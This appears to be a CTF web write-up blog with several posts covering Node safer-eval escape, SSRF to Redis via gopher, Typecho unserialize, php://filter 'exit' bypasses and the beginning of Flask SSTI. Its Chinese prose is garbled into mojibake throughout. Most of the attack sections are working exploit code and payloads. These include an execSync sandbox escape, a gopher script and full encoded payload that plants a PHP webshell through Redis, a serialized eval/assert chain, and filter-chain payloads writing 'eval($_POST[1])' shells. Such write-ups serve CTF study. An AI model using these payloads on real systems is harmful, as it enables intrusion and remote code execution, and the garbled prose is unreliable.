3.EzNodeå°±æ˜¯ä¸€ä¸ªå¾ˆåŸºç¡€çš„ä»£ç å®¡è®¡ï¼š 12345678910111213141516171819202122232425262728app.use(bodyParser.urlencoded(&#123; extended: false &#125;));app.use(bodyParser.json());// 2020.1/WORKER2 è€æ¿è¯´ä¸ºäº†åæœŸæ–¹ä¾¿ä¼˜åŒ–app.use((req, res, next) =&gt; &#123; if (req.path === &#x27;/eval&#x27;) &#123; let delay = 60 * 1000; console.log(delay); if (Number.isInteger(parseInt(req.query.delay))) &#123; delay = Math.max(delay, parseInt(req.query.delay)); &#125; const t = setTimeout(() =&gt; next(), delay); // 2020.1/WORKER3 è€æ¿è¯´è®©æˆ‘ä¼˜åŒ–ä¸€ä¸‹é€Ÿåº¦ï¼Œæˆ‘å°±ç›´æ¥è¿™æ ·å†™äº†ï¼Œå…¶ä»–äººå†™äº†å•¥å…³æˆ‘päº‹ setTimeout(() =&gt; &#123; clearTimeout(t); console.log(&#x27;timeout&#x27;); try &#123; res.send(&#x27;Timeout!&#x27;); &#125; catch (e) &#123; &#125; &#125;, 1000); &#125; else &#123; next(); &#125;&#125;); æ³¨æ„æ ¸å¿ƒä»£ç åœ¨worker2åˆ°worker3ä¹‹é—´ï¼Œæˆ‘ä»¬å‘ç°å¦‚æœdelayè¢«è®¾ç½®æˆäº†60*1000 è€Œè¶…æ—¶æ˜¯1000.å¦‚æœæ²¡æœ‰è¶…æ—¶ï¼Œåè€Œä¼šnextï¼Œä¹Ÿå°±æ˜¯ä¼šç»§ç»­æ‰§è¡Œä»£ç ï¼Œå¦åˆ™ç›´æ¥å¼¹å›å»è¶…æ—¶ï¼Œäºæ˜¯æˆ‘ä»¬çœ‹ä¸‹ä¸€æ­¥ 123456789101112app.post(&#x27;/eval&#x27;, function (req, res) &#123; let response = &#x27;&#x27;; if (req.body.e) &#123; try &#123; response = saferEval(req.body.e); &#125; catch (e) &#123; response = &#x27;Wrong Wrong Wrong!!!!&#x27;; &#125; &#125; res.send(String(response));&#125;); ä¸‹é¢ä½¿ç”¨äº†saferEvalçš„ä»£ç ï¼Œæ¥æ”¶eçš„å‚æ•°ï¼Œäºæ˜¯æˆ‘ä»¬çš„ç›®æ ‡å¾ˆæ¸…æ™°ï¼Œé¦–å…ˆå°è¯•ç»•è¿‡å¯¹è¶…æ—¶çš„é™åˆ¶ï¼Œå†æœä¸€ä¸‹saferEvalçš„æ•°æ®~ï¼Œæ–‡æ¡£è¯´åˆ°ï¼š 1parseInt(string, radix) å‚æ•° æè¿° string å¿…éœ€ã€‚è¦è¢«è§£æçš„å­—ç¬¦ä¸²ã€‚ radix å¯é€‰ã€‚è¡¨ç¤ºè¦è§£æçš„æ•°å­—çš„åŸºæ•°ã€‚è¯¥å€¼ä»‹äº 2 ~ 36 ä¹‹é—´ã€‚å¦‚æœçœç•¥è¯¥å‚æ•°æˆ–å…¶å€¼ä¸º 0ï¼Œåˆ™æ•°å­—å°†ä»¥ 10 ä¸ºåŸºç¡€æ¥è§£æã€‚å¦‚æœå®ƒä»¥ â€œ0xâ€ æˆ– â€œ0Xâ€ å¼€å¤´ï¼Œå°†ä»¥ 16 ä¸ºåŸºæ•°ã€‚å¦‚æœè¯¥å‚æ•°å°äº 2 æˆ–è€…å¤§äº 36ï¼Œåˆ™ parseInt() å°†è¿”å› NaNã€‚ è¿™ä¹Ÿå°±è¯´æ˜ï¼Œå¦‚æœä¼ å…¥delayæ˜¯å¾ˆå¤§å¾ˆå¤§çš„æ•°ï¼Œä¹Ÿå°±ä¸èƒ½è¢«è§£æäº†ï¼Œé‚£æˆ‘ä»¬çš„delayæ­¤æ—¶å˜æˆäº†1ç§’ï¼Œä¹Ÿå°±ç»•è¿‡äº†è¶…æ—¶é™åˆ¶ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥å‘½ä»¤æ‰§è¡Œå’¯ï¼Œå°è¯•ï¼š å‘ç°æ­¤æ—¶å°±ç»•è¿‡äº†è¶…æ—¶çš„é™åˆ¶äº†ï¼ï¼Œäºæ˜¯å†æ„é€ æ‰§è¡ŒEvalSaferçš„ä»£ç ï¼ŒæŸ¥åˆ°æ˜¯CVE-2019-10769 1https:&#x2F;&#x2F;github.com&#x2F;commenthol&#x2F;safer-eval&#x2F;issues&#x2F;10 payloadå¦‚ä¸‹ï¼š 123456789const saferEval = require(&quot;./src/index&quot;);const theFunction = function () &#123; const process = clearImmediate.constructor(&quot;return process;&quot;)(); return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()&#125;;const untrusted = `($&#123;theFunction&#125;)()`;console.log(saferEval(untrusted)); å…¶ä¸­æ ¸å¿ƒä»£ç å°±æ˜¯theFunctionï¼Œæˆ‘ä»¬ä¼ å…¥è¿›å»æ±¡æŸ“å‚æ•°å³å¯æ‰§è¡Œä»£ç  4.EzWebæ˜¯ä¸€ä¸ªredisçš„é¢˜ç›®..æ²¡æœ‰åšè¿‡è¿™æ ·çš„ï¼Œç¡¬ç€å¤´çš®åšå§ï¼Œè®¿é—®ä¹‹åæ ¹æ®æç¤ºè®¿é—® ?secret æŸ¥è¯¢äº†ä¸€äº›ï¼Œè¿™æ˜¯å†…ç½‘çš„ç¯å¢ƒï¼Œä¹Ÿå°±æ˜¯è¯´è™½ç„¶é¢˜ç›®è¿‡æ»¤äº†127.0.0.1,ä½†æ˜¯æˆ‘ä»¬å¯ä»¥æµ‹è¯•å…¶ä»–é¶æœºçš„å†…å®¹ è®¿é—®è¿‡å»ä¹‹åå¥½åƒä¹Ÿä¸æ˜¯å•¥ç©æ„å„¿å•Š,å°è¯•ç”¨fileåè®®çš„æ¼æ´è¯»åˆ°äº†index.phpçš„æºç ï¼š file:[ç©ºæ ¼]/ 1?url&#x3D;file:%20&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&amp;submit&#x3D;æäº¤ 123456789101112131415161718192021222324&lt;!--?secret--&gt;&lt;?phpfunction curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); echo curl_exec($ch); curl_close($ch);&#125;if(isset($_GET[&#x27;submit&#x27;]))&#123; $url = $_GET[&#x27;url&#x27;]; //echo $url.&quot;\\n&quot;; if(preg_match(&#x27;/file\\:\\/\\/|dict|\\.\\.\\/|127.0.0.1|localhost/is&#x27;, $url,$match)) &#123; //var_dump($match); die(&#x27;åˆ«è¿™æ ·&#x27;); &#125; curl($url);&#125;if(isset($_GET[&#x27;secret&#x27;]))&#123; system(&#x27;ifconfig&#x27;);&#125;?&gt; æˆ‘ä»¬å‘ç°è¿‡æ»¤äº†dictåè®®ï¼Œfileåè®®ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤httpåè®®å’Œgopheråè®®ï¼Œæˆ‘ä»¬çŒœæƒ³å‡ºé¢˜äººæƒ³è®©æˆ‘ä»¬åˆ©ç”¨httpåè®®è¿›è¡Œå†…ç½‘æ¢æµ‹ï¼Œgopheråè®®è¿›è¡Œæ”»å‡»,æœç„¶ï¼Œåœ¨11ç«¯å£ä¸Šæ‰¾åˆ°äº†å˜åŒ– è®©æˆ‘ä»¬å°è¯•æœåŠ¡ï¼Œå› ä¸ºssrfå¸¸ç”¨çš„å‡ ä¸ªæœåŠ¡å°±æ˜¯mysqlå’Œredisï¼Œäºæ˜¯åˆ†åˆ«è®¿é—®3306ç«¯å£å’Œ6379ç«¯å£ 6379ä¸Šå¾—åˆ°ï¼š å‘ç°æœç„¶æœ‰ERRç«¯å£ï¼Œäºæ˜¯å°è¯•ç”¨gopheråè®®æ‰“ä¸€æ³¢ï¼Œè¿™é‡Œç›´æ¥ç”¨äº†ä¸€æ³¢åˆ«äººçš„è„šæœ¬ 1234567891011121314151617181920212223242526272829303132import urllibprotocol=&quot;gopher://&quot;ip=&quot;173.96.119.11&quot; // è¿è¡Œæœ‰redisçš„ä¸»æœºipport=&quot;6379&quot;shell=&quot;\\n\\n&lt;?php system(\\&quot;cat /flag\\&quot;);?&gt;\\n\\n&quot;filename=&quot;shell.php&quot;path=&quot;/var/www/html&quot;passwd=&quot;&quot;cmd=[&quot;flushall&quot;, &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)), &quot;config set dir &#123;&#125;&quot;.format(path), &quot;config set dbfilename &#123;&#125;&quot;.format(filename), &quot;save&quot; ]if passwd: cmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;def redis_format(arr): CRLF=&quot;\\r\\n&quot; redis_arr = arr.split(&quot; &quot;) cmd=&quot;&quot; cmd+=&quot;*&quot;+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;) cmd+=CRLF return cmdif __name__==&quot;__main__&quot;: for x in cmd: payload += urllib.quote(redis_format(x)) print payload æˆ‘ä»¬æ”¹ä¸€ä¸‹ä¸»æœºIPä¸º:10.160.187.11 å¾—åˆ°payload: 1gopher:&#x2F;&#x2F;10.160.187.11:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20&#x2F;flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A 5.EZä¸‰å‰‘å®¢-EzTypechoè¿™é“é¢˜ç›®ï¼Œå‘ƒï¼ŒåŸç†æ¯”è¾ƒéš¾ï¼Œä½†æ˜¯åˆ©ç”¨èµ·æ¥å´å¾ˆç®€å•ï¼Œæ¯”å¦‚åœ¨è¿™ç¯‡æ–‡ç« ä¸­å¯ä»¥æ‰¾åˆ°ï¼š 1https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;155753.html expå°±å¯ä»¥æ‰¾åˆ°äº†ï¼Œåœ¨åšé¢˜çš„æ—¶å€™ç›´æ¥åœ¨finishæ—¶ä¼šå‘ç°æ— æ³•åˆ©ç”¨çš„æƒ…å†µ è¿™ä¸ªæ—¶å€™å°±å¿…é¡»çœ‹æºç äº† æŸ¥æ‰¾sessionï¼Œåœ¨æºç ä¸­å¯ä»¥æ‰¾åˆ°ï¼š 12345678910 &lt;?php else : ?&gt; &lt;?php//if(!isset($_SESSION)) &#123; die(&#x27;no, you can\\&#x27;t unserialize it without session QAQ&#x27;);&#125; $config = unserialize(base64_decode(Typecho_Cookie::get(&#x27;__typecho_config&#x27;))); Typecho_Cookie::delete(&#x27;__typecho_config&#x27;); $db = new Typecho_Db($config[&#x27;adapter&#x27;], $config[&#x27;prefix&#x27;]); $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE); Typecho_Db::set($db); ?&gt; æˆ‘ä»¬å»æŸ¥æ‰¾sesionåœ¨å“ªé‡Œèµ‹å€¼ï¼š ç»“æœå‘ç°ä¸€æ—¦åœ¨è¿™é‡Œå°±è¢«exitåœä¸‹æ¥äº†ï¼Œäºæ˜¯æŸ¥æ‰¾startï¼Œç»“æœå‘ç°æºç å½“ä¸­ï¼š 1234&lt;?php $config = unserialize(base64_decode(Typecho_Cookie::get(&#x27;__typecho_config&#x27;))); $type = explode(&#x27;_&#x27;, $config[&#x27;adapter&#x27;]); $type = array_pop($type); å‘ç°å®ƒå±…ç„¶æ¥æ”¶ä¸€ä¸ªå‚æ•°â€¦é‚£è¿™æ ·çš„è¯æˆ‘ä»¬ç”¨è¿™ä¸ªå»æ‰“å°±è¡Œäº†ï¼Œåˆ©ç”¨è„šæœ¬ï¼š 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phpclass Typecho_Feed&#123; private $_type; private $_items = array(); public function __construct()&#123; $this-&gt;_type = &quot;RSS 2.0&quot;; $this-&gt;_items = array( array( &quot;title&quot; =&gt; &quot;test&quot;, &quot;link&quot; =&gt; &quot;test&quot;, &quot;data&quot; =&gt; &quot;20190430&quot;, &quot;author&quot; =&gt; new Typecho_Request(), ), ); &#125;&#125;class Typecho_Request&#123; private $_params = array(); private $_filter = array(); public function __construct()&#123; $this-&gt;_params = array( &quot;screenName&quot; =&gt; &quot;eval(&#x27;echo `cat /flag`;exit();&#x27;)&quot;, ); $this-&gt;_filter = array(&quot;assert&quot;); &#125;&#125;$a = new Typecho_Feed();$c = array( &quot;adapter&quot; =&gt; $a, &quot;prefix&quot; =&gt; &quot;test&quot;,);echo base64_encode(serialize($c)); æ‹¿åˆ°flagï¼š æ€»ç»“ï¼šâ€‹ é¢˜ç›®è™½ç„¶åŸç†éƒ½å¾ˆéš¾ï¼Œä½†æ˜¯åˆ©ç”¨å´å¾ˆç®€å•ï¼Œè‡ªå·±å…ˆæŠŠé¢˜ç›®æˆåŠŸçš„å¤ç°æ¥å‡ºæ¥äº†ï¼Œä»¥åå†é€æ­¥å¤ç°åŸç†æŠŠã€‚","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"nodejs","slug":"nodejs","permalink":"http://example.com/tags/nodejs/"},{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"},{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"å…¨å›½å·¥æ§2020-web-easyphp","slug":"å…¨å›½å·¥æ§2020-web-easyphp","date":"2020-10-27T06:25:53.000Z","updated":"2020-11-17T06:15:26.691Z","comments":true,"path":"2020/10/27/å…¨å›½å·¥æ§2020-web-easyphp/","link":"","permalink":"http://example.com/2020/10/27/%E5%85%A8%E5%9B%BD%E5%B7%A5%E6%8E%A72020-web-easyphp/","excerpt":"","text":"å…¨å›½å·¥æ§2020-web-easyphp1.ä»ä¼ªåè®®å¼€å§‹è¯´èµ·php://filteræ˜¯PHPä¸­ç‹¬æœ‰çš„åè®®ï¼Œè¯¥åè®®æµå…è®¸æˆ‘ä»¬ä½œä¸ºä¸€ä¸ªä¸­é—´æµæ¥å¤„ç†å…¶ä»–æµï¼Œ åœ¨ä¹‹å‰ä¸‰ä¸ªç™½å¸½ä¸­æœ‰ä¸€ä¸ªæ¯”èµ›ï¼Œå…¶ä¸­ä¸€éƒ¨åˆ†çš„ä»£ç ï¼š 1234&lt;?php$content = &#x27;&lt;?php exit; ?&gt;&#x27;;$content .= $_POST[&#x27;txt&#x27;];file_put_contents($_POST[&#x27;filename&#x27;], $content); 1.base64åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹è§ï¼Œå¦‚æœæ­£å¸¸çš„ç¼–è¯‘ä»£ç ï¼Œç”±äºåœ¨å¼€å¤´åŠ å…¥äº†exitå†…å®¹ï¼Œå³ä½¿æˆ‘ä»¬å†™å…¥äº†ä¸€å¥è¯ä¹Ÿæ— æ³•è§£æã€‚ ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡filenameåœ¨phpå†™å…¥çš„æ—¶å€™æ„é€ åè®®ï¼Œæ‰€ä»¥åˆ©ç”¨base64-decodeæ–¹æ³•è§£ç æ„é€ ä¸€å¥è¯çš„payloadï¼š 1PD9waHAgcGhwaW5mbygpOyA&#x2F;Pg&#x3D;&#x3D; ä½†æ˜¯åœ¨è¿™é‡Œæˆ‘ä»¬åˆä¼šå‘ç°å¦‚æœç›´æ¥æ‰“å…¥è¿›å»ï¼Œbase64è§£ææ²¡æœ‰æˆåŠŸï¼Œè¿™å°±æ˜¯å› ä¸ºbaseæ˜¯ç”±4å­—èŠ‚ç»„æˆä¸€æ¬¡payloadã€‚æ‰€ä»¥è¯è¯´å›å»ï¼Œ å½“æˆ‘ä»¬ä½¿ç”¨base64decodeåè®®çš„æ—¶å€™ï¼Œ&lt; ? ; ?&gt;ç­‰ç­‰éƒ½ä¸ä¼šè¢«è§£æï¼Œæ‰€ä»¥æºä»£ç åˆ™ä¼šè¢«è¯†åˆ«ä¸ºï¼š phpexitï¼Œè€Œbase64æ˜¯å››ä¸ªå­—èŠ‚è¿˜åŸæˆä¸€ä¸ªå­—æ¯ï¼Œæ•…æˆ‘ä»¬éœ€è¦å†å ä¸€ä¸ªä½æ•°ï¼Œç»™å¥¹ï¼Œä¹Ÿå°±æ˜¯phpexit[?]æ„é€ æˆå…«ä¸ªå­—èŠ‚ä¾›basedecodeä½¿ç”¨ï¼Œä¹‹ååœ¨åé¢å†ç¼–ä¸Šæˆ‘ä»¬è‡ªå·±çš„payloadï¼Œæ‰€ä»¥è¿™é“é¢˜å¯ä»¥æ„é€ å¦‚ä¸‹ï¼š 1filename=php://filter/write=convert.base64-decode/resource=shell.php&amp;txt=cPD9waHAgcGhwaW5mbygpOyA/Pg== ä½†æ˜¯è¿™é‡Œä»éœ€è¦æ³¨æ„ï¼Œæˆ‘ä»¬æ„é€ çš„æ—¶å€™payloadå½“ä¸­ä¸å…è®¸å‡ºç°+å·ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œå¦åˆ™ä¼šé‡è§æ²¡æœ‰è¢«å†™ä¸Šå»æƒ…å†µã€‚ï¼Œå®é™…ä¸Šï¼Œé™¤äº†baseè¿‡æ»¤å™¨ï¼Œè¿˜æœ‰å¾ˆå¤šè¿‡æ»¤å™¨å¯ä»¥ä¾›ç»™æˆ‘ä»¬ä½¿ç”¨ï¼š å®˜ç½‘ï¼š 123https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.php è¿‡æ»¤å™¨https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.convert.php è½¬æ¢è¿‡æ»¤å™¨https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.string.php å­—ç¬¦è¿‡æ»¤å™¨ 2.rot13é™¤æ­¤ä¹‹å¤–æˆ‘å°è¯•ä½¿ç”¨rot13æ¥ç»•è¿‡ï¼Œä½†æ˜¯ä¼šå‘ç°rot13ä¹‹åçš„ç»“æœä¸åˆæ³• 1filename=php://filter/write=string.rot13/resource=shell.php&amp;txt=&lt;?cuc cucvasb();?&gt; å¾—åˆ°phpä¸ºï¼š 1&lt;?cuc rkvg; ?&gt;&lt;?php phpinfo();?&gt; è¿™æ ·çš„è¯ï¼Œå› ä¸ºå¤šäº†ä¸€ä¸ªåˆ†å·ï¼Œè€Œå¯¼è‡´å¤±è´¥äº†ï¼ˆå¼€å¯çŸ­æ ‡ç­¾çš„æƒ…å†µä¸‹ï¼Œåªè¦ç”¨&lt;? ?&gt;ä¸­çš„å†…å®¹å°±ä¼šè¢«è§£æï¼‰ä½†å¦‚æœå…³é—­çŸ­æ ‡ç­¾çš„æƒ…å†µä¸‹ï¼š 1txt=?&gt;&lt;?cuc cucvasb();?&gt;&amp;filename=php://filter/write=string.rot13/resource=shell.php æˆåŠŸï¼é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜è¡¥å……ä¸€ç§éªšæ€è·¯ï¼š 3.iconvå­—ç¬¦ç¼–ç è½¬æ¢1echo iconv(&quot;utf-8&quot;,&quot;utf-7&quot;,&quot;&lt;?php phpinfo(); ?&gt;&quot;) iconvå‡½æ•°æ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼Œå½“å‰ç¼–ç ï¼Œè½¬æ¢åç¼–ç ï¼Œä¹‹åå†è½¬å›å»ï¼Œæ‰€ä»¥åˆ©ç”¨è¯¥ç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥åå…¶é“è¡Œä¹‹ã€‚ä½†æ˜¯åœ¨è¿™é‡Œï¼Œåˆ©ç”¨è¯¥å­—ç¬¦ç¼–ç ï¼Œä¼šå¯¼è‡´å‡ºç°ä¹‹å‰çš„+å·çš„é—®é¢˜ï¼Œäºæ˜¯å°±å¤±è´¥äº† 1filename=php://filter/write=convert.utf-7.utf-8/resource=shell.php&amp;txt=?+AD4-+ADw?php phpinfo()+ADs ?+AD4- æ ¹æ®å¤§ä½¬ç»™å‡ºçš„UCS2-2 ç¼–ç çš„æ–¹å¼ï¼š 1echo iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;,&#x27;&lt;?php phpinfo();?&gt;&#x27;); éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒUCS2çš„ç¼–ç æ–¹å¼æ˜¯2ä½ä¸€æ¬¡è½¬æ¢ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»ä¿è¯éœ€è¦è½¬æ¢çš„ç¼–ç ä¸º2ä½æ•°ï¼Œä¸å¤Ÿçš„æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç©ºæ ¼å ä½,è€Œæˆ‘ä»¬ä¸Šé¢çš„è½¬æ¢ä¹‹åç›´æ¥ç”¨çš„è¯ï¼Œä¼šå‘ç°æ— æ³•è½¬æ¢ï¼Œè¿™æ˜¯å› ä¸ºå¿…é¡»ä¿è¯&lt;?php exit();ä¹Ÿè¢«æˆåŠŸè½¬æ¢ï¼Œæ‰€ä»¥æˆ‘ä»¬å†å‰é¢å†åŠ ä¸Šä¸€ä¸ª1å³å¯ï¼Œ æœ€ç»ˆpayloadï¼š 1filename=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php&amp;txt=1?&lt;hp phpipfn(o;)&gt;? å†™å…¥shellï¼š 1filename=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php&amp;txt=1?&lt;hp+pvela$(P_SO[T]1;)&gt;? 4.ç»„åˆä½¿ç”¨ï¼š 1filename=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13/resource=shell.php&amp;txt=1?&lt;uc ciryn$(C_FB[G]1;)&gt;? è¿˜å¯ä»¥å°è¯•ä½¿ç”¨srtip_tags+base64çš„æ–¹å¼è¿›è¡Œç»•è¿‡ 1filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&amp;txt=PD9waHAgcGhwaW5mbygpOyA/Pg== ç»è¿‡è¯¥æ–¹å¼æ„é€ çš„payloadï¼Œä¼šè¿›è¡Œstrip_tagsï¼Œå»é™¤æ‰äº†å‰é¢çš„å†…å®¹ï¼Œä¹‹åå†ç”¨base64è§£å‹äº†æˆ‘ä»¬çš„å†…å®¹ã€‚ è®²å®Œä¸Šé¢çš„ï¼Œå†å›åˆ°wmctfçš„check in2ï¼Œé¢˜ç›®çš„æºç ä¸ºï¼š 123456789101112&lt;?phperror_reporting(0);highlight_file(__FILE__);if (isset($_GET[&#x27;content&#x27;])) &#123; $content = $_GET[&#x27;content&#x27;]; if (preg_match(&#x27;/iconv|UCS|UTF|rot|quoted|base64|dechunk|\\.\\./i&#x27;, $content)) die(&#x27;hacker&#x27;); if (file_exists($content)) require_once($content); file_put_contents($content, &#x27;&lt;?php exit();&#x27; . $content);&#125; è¿‡æ»¤å™¨è¿‡æ»¤äº†å¾ˆå¤šï¼Œæˆ‘ä»¬åªå‰©ä¸‹äº†å‹ç¼©è¿‡æ»¤å™¨ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡zlib.inflateè§£å‹å­—ç¬¦ï¼Œä¹‹åå†åˆ©ç”¨zlib.deflateå‹ç¼©çš„æ–¹å¼getshellï¼Œstr.tolowerä¼šåœ¨ 1php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt; é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰äºŒæ¬¡ç¼–ç ç»•è¿‡çš„æ–¹å¼ 1http://localhost/?content=php://filter/write=string.%7%32ot13|?&gt;&lt;?cuc cucvasb();?&gt;|/resource=shell.php è€Œæ˜¨å¤©çš„æ¯”èµ›è¿‡æ»¤äº†tolower,upperç­‰ç­‰ï¼Œç”šè‡³åˆæŠŠ%è¿‡æ»¤äº†ï¼Œå¯¼è‡´æˆ‘ä»¬æ²¡æ³•ç”¨ä¸Šé¢ä¸¤ä¸ªpayloadäº†ï¼Œä½†æ˜¯æˆ‘ä»¬ä¾ç„¶å¯ä»¥åˆ©ç”¨zlibçš„ deflateï¼Œä¹‹åå†åˆ©ç”¨urlç¼–ç è§£æï¼Œå¾—å‡ºå¦‚ä¸‹payload 123php://filter/write=string.strip_tags|zlib.inflate|%3F%3E%b3%b1%2f%c8%28%50%28%ae%2c%2e%49%cd%d5%50%89%77%77%0d%89%8e%8f%d5%b4%b6%b7%03%3C%3F/resource=shell.php","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"}]},{"title":"FlaskSSti","slug":"FlaskSSti","date":"2020-10-27T06:01:27.000Z","updated":"2020-11-17T06:19:55.707Z","comments":true,"path":"2020/10/27/FlaskSSti/","link":"","permalink":"http://example.com/2020/10/27/FlaskSSti/","excerpt":"ä¸€ç›´å¯¹sstiæ¯”è¾ƒæ¨¡ç³Šï¼Œé‡è§çš„æ—¶å€™éƒ½æ˜¯ç½‘ä¸Šå»ç…§æŠ„payloadå»æ‰“ï¼Œè‡ªå·±æ²¡æœ‰ä»€ä¹ˆä¸»åŠ¨æ„é€ payloadçš„èƒ½åŠ›ï¼Œè¿™æ¬¡é‡è§ä¸€é“é¢˜å†³å®šæ€»ç»“ä¸€äº›è¯¥æ€ä¹ˆåš","text":"ä¸€ç›´å¯¹sstiæ¯”è¾ƒæ¨¡ç³Šï¼Œé‡è§çš„æ—¶å€™éƒ½æ˜¯ç½‘ä¸Šå»ç…§æŠ„payloadå»æ‰“ï¼Œè‡ªå·±æ²¡æœ‰ä»€ä¹ˆä¸»åŠ¨æ„é€ payloadçš„èƒ½åŠ›ï¼Œè¿™æ¬¡é‡è§ä¸€é“é¢˜å†³å®šæ€»ç»“ä¸€äº›è¯¥æ€ä¹ˆåš 1.hackbar è‡ªå¸¦çš„payloadå¦‚ä½•æ„æˆçš„ç¬¬ä¸€ä»¶äº‹æƒ…ï¼Œå°±æ˜¯æ­å»ºæˆ‘ä»¬çš„ç¯å¢ƒï¼š 123456789101112131415from flask import Flask, request, render_template_stringapp = Flask(__name__)@app.route(&#x27;/&#x27;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def index(): id = request.args.get(&quot;id&quot;) html = &#x27;&#x27;&#x27;&lt;h1&gt;%s&lt;/h1&gt; &#x27;&#x27;&#x27; % (id) return render_template_string(html)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=80) è¿™ç§å°±æ˜¯æœ€åŸºæœ¬çš„flaskï¼Œåœ¨flaskå½“ä¸­jinjiaçš„æ¨¡æ¿ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸¤ä¸ªèŠ±æ‹¬å·å°±å¯ä»¥å…è®¸ä¸€äº›åŸºæœ¬çš„è¿ç®— ç”¨äºæ‰§è¡Œifï¼Œforå¾ªç¯ç­‰ç­‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸€ä¸ªæœ€åŸºæœ¬çš„payloadçš„æ„é€ æ–¹å¼æ˜¯è¯¥æ€ä¹ˆè§¦å‘å‘¢ï¼Ÿç¬¬ä¸€æ­¥ï¼Œä»configç±»è§¦å‘ï¼Œå› ä¸ºFlaské‡Œé¢è‡ªå¸¦ 1http://localhost/?id=&#123;&#123; config.items() &#125;&#125; é€šè¿‡è¿™ä¸ªç±»æˆ‘ä»¬å¯ä»¥å¾—åˆ°æ‰€æœ‰çš„flaskçš„config~ï¼Œè€Œè¿™ä¸€çš„æ„ä¹‰å¥½åƒä¸æ˜¯å¾ˆå¤§ï¼Ÿæˆ‘ä»¬å¾—ä¸åˆ°å¾ˆå¤šä¸œè¥¿ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªä½œä¸ºè·³æ¿ï¼Œæ‰§è¡Œä¸‹ä¸€æ­¥ 1.__class__.__init__ __classæ–¹æ³•å±æ€§çš„æ—¶å€™ä¼šåªæƒ³è¯¥å®ä¾‹å¯¹åº”çš„ç±»ï¼Œæ­¤æ—¶configçš„ç±»æ˜¯Config,ç„¶åå¯ä»¥å†å»è°ƒç”¨å…¶å®ƒç±»å±æ€§ï¼Œå¦‚æœæˆ‘ä»¬å®¡è®¡äº†æºç ï¼Œå°±å¯ä»¥çŸ¥é“æˆ‘ä»¬æ­¤æ—¶çš„Configç±»ä½äºconfig.py80å¤šè¡Œï¼Œå½“æˆ‘ä»¬æ‰§è¡Œ__init__ä¹‹åï¼Œä¾¿å¯ä»¥åœ¨ä¸‹é¢çš„101è¡Œæ‰¾åˆ°è¿™ä¹ˆä¸€è¡Œä»£ç ï¼š 1rv = os.environ.get(variable_name) ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬çš„configç±»å½“ä¸­å«æœ‰osåº“çš„æ–¹æ³•ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥ä½¿ç”¨æ˜¯ä¸è¡Œçš„ï¼Œä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡globalså‡½æ•°å…ˆè·å–åˆ°å®ƒï¼Œäºæ˜¯å¾—åˆ°ï¼š globals() 